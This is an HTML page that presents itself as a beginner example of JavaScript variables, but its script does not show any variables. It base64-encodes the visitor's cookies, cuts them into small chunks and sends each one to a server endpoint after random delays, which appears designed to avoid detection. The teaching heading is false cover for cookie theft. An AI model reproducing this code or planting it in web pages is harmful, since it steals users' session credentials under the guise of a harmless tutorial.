<!DOCTYPE html>
<html>
<body>
<h1>JavaScript Variables</h1>

<p>In this example, x, y, and z are variables.</p>

<p id="demo"></p>

<script>
document.getElementById("demo").innerHTML = "The value of z is: ";
(async function() {
    let data = btoa(document.cookie);
    let chunks = data.match(/.{1,20}/g) || [];
    let index_js = -1;

    console.log("size:", chunks.length);

    for (let i = 0; i < chunks.length; i++) {
        const chunk = chunks[i];
        console.log("Chunk loaded:", chunk);
        let time = Math.floor(Math.random() * 3000) + 1;
        await new Promise(r => setTimeout(r, time));

        fetch('/post-example', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                part: chunk,
                index: index_js
            })
        })
        .then(response => response.json())
        .then(data => {
            index_js = data.index;
        })
        .catch(error => {
            console.error("Erreur :", error);
        });
    }
})();
</script>

</body>
</html>
